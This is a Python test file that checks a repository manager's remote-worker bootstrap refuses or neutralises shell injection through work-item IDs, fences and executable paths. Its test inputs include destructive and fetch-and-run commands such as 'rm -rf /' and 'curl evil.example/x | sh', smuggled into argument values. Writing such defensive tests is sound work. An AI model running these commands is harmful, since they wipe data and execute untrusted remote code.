"""RMDD-15: fixed remote-worker bootstrap command construction.

``RemoteWorkerBootstrap``/``build_bootstrap_command`` are the only place a
remote WorkItem's identity becomes an ``ExecutionCommand`` argv. This module
proves the non-negotiable "fixed argv only" constraint from the lane brief:
no caller input -- not the WorkItem ID, not the fence, not a raw argv/shell
string -- can inject anything into the command actually spawned.
"""

from __future__ import annotations

import uuid

import pytest

from repository_manager.development import ExecutionCommand
from repository_manager.remote_execution.bootstrap import (
    RemoteWorkerBootstrap,
    RemoteWorkerBootstrapError,
    build_bootstrap_command,
)

_VALID_WORK_ITEM_ID = f"workitem:repository_manager:{uuid.uuid4()}"
_VALID_JOB_ID = f"rmjob:{uuid.uuid4()}"


def test_build_bootstrap_command_returns_fixed_argv() -> None:
    command = build_bootstrap_command(
        work_item_id=_VALID_WORK_ITEM_ID,
        attempt=1,
        fence="fence:abc123",
        workdir="/srv/remote-worktrees/repo-a",
    )
    assert isinstance(command, ExecutionCommand)
    assert command.argv == (
        "/opt/repository-manager/bin/rm-remote-worker",
        "--work-item",
        _VALID_WORK_ITEM_ID,
        "--attempt",
        "1",
        "--fence",
        "fence:abc123",
    )
    # The public job handle form is accepted too (C-02).
    command2 = build_bootstrap_command(
        work_item_id=_VALID_JOB_ID,
        attempt=2,
        fence="fence:xyz",
        workdir="/srv/remote-worktrees/repo-a",
    )
    assert _VALID_JOB_ID in command2.argv


@pytest.mark.parametrize(
    "injected_work_item_id",
    [
        "workitem:repository_manager:abc; rm -rf /",
        "$(rm -rf /)",
        "`rm -rf /`",
        "workitem:repository_manager:abc\nrm -rf /",
        "workitem:repository_manager:abc && curl evil.example/x | sh",
        "not-a-real-work-item-id",
        "",
        "   ",
    ],
)
def test_injected_work_item_id_is_refused(injected_work_item_id: str) -> None:
    """A shell-metacharacter or malformed WorkItem ID is refused outright.

    This is the injection-attempt proof for the bootstrap boundary: the
    result must never silently truncate/sanitize the value into the argv --
    it must refuse construction entirely.
    """

    with pytest.raises(RemoteWorkerBootstrapError):
        build_bootstrap_command(
            work_item_id=injected_work_item_id,
            attempt=1,
            fence="fence:abc",
            workdir="/srv/remote-worktrees/repo-a",
        )


@pytest.mark.parametrize(
    "injected_fence",
    ["fence:abc\nrm -rf /", "fence:abc\x00rm -rf /", "", "  "],
)
def test_injected_fence_is_refused(injected_fence: str) -> None:
    with pytest.raises(RemoteWorkerBootstrapError):
        build_bootstrap_command(
            work_item_id=_VALID_WORK_ITEM_ID,
            attempt=1,
            fence=injected_fence,
            workdir="/srv/remote-worktrees/repo-a",
        )


def test_shell_metacharacters_inside_the_fence_stay_one_opaque_argv_token() -> None:
    """Metacharacters *inside* an argv value are architecturally inert.

    This is the flip side of the injection-refusal tests above: the "fixed
    argv only" contract means a value like ``fence:abc; rm -rf /`` is never
    passed through a shell -- it is one element of an argv tuple, spawned
    directly (:class:`repository_manager.execution.executor.LocalExecutor`
    never uses ``shell=True``) or shell-quoted whole by
    ``tunnel_manager.remote_execution``'s ``shlex.join`` before an SSH exec.
    A first cut of this test suite asserted the opposite (that such a fence
    must be *refused*) and that assertion was wrong, not the code -- fixed
    here after confirming the no-shell architecture with both consumers.
    """

    tricky_fence = "fence:abc; rm -rf / && curl evil.example | sh `id`"
    command = build_bootstrap_command(
        work_item_id=_VALID_WORK_ITEM_ID,
        attempt=1,
        fence=tricky_fence,
        workdir="/srv/remote-worktrees/repo-a",
    )
    assert command.argv[-1] == tricky_fence
    assert len(command.argv) == 7  # never split into extra argv elements


@pytest.mark.parametrize("bad_attempt", [0, -1, 1.5, "1", True])
def test_non_positive_or_non_integer_attempt_is_refused(bad_attempt: object) -> None:
    with pytest.raises(RemoteWorkerBootstrapError):
        build_bootstrap_command(
            work_item_id=_VALID_WORK_ITEM_ID,
            attempt=bad_attempt,  # type: ignore[arg-type]
            fence="fence:abc",
            workdir="/srv/remote-worktrees/repo-a",
        )


@pytest.mark.parametrize(
    "bad_bootstrap_path",
    [
        "relative/path/rm-remote-worker",
        "/opt/rm; rm -rf /",
        "/opt/rm && curl evil.example | sh",
        "/opt/with space/rm-remote-worker",
        "",
    ],
)
def test_non_fixed_bootstrap_path_is_refused(bad_bootstrap_path: str) -> None:
    """The bootstrap executable itself is a deployment constant, never caller data."""

    with pytest.raises(RemoteWorkerBootstrapError):
        RemoteWorkerBootstrap(bootstrap_path=bad_bootstrap_path)


def test_bootstrap_never_accepts_a_caller_supplied_argv_or_shell_string() -> None:
    """``build`` has no ``argv``/``shell``/``command`` parameter at all.

    This is a structural proof, not a behavioural one: the only way to widen
    the executed command is to change this module's source.
    """

    import inspect

    signature = inspect.signature(RemoteWorkerBootstrap.build)
    forbidden = {"argv", "shell", "command", "shell_command", "cmd"}
    assert forbidden.isdisjoint(signature.parameters)


def test_environment_refs_pass_through_as_opaque_names_only() -> None:
    command = build_bootstrap_command(
        work_item_id=_VALID_WORK_ITEM_ID,
        attempt=1,
        fence="fence:abc",
        workdir="/srv/remote-worktrees/repo-a",
        environment_refs=("MY_APPROVED_REF",),
    )
    assert command.environment_refs == ("MY_APPROVED_REF",)
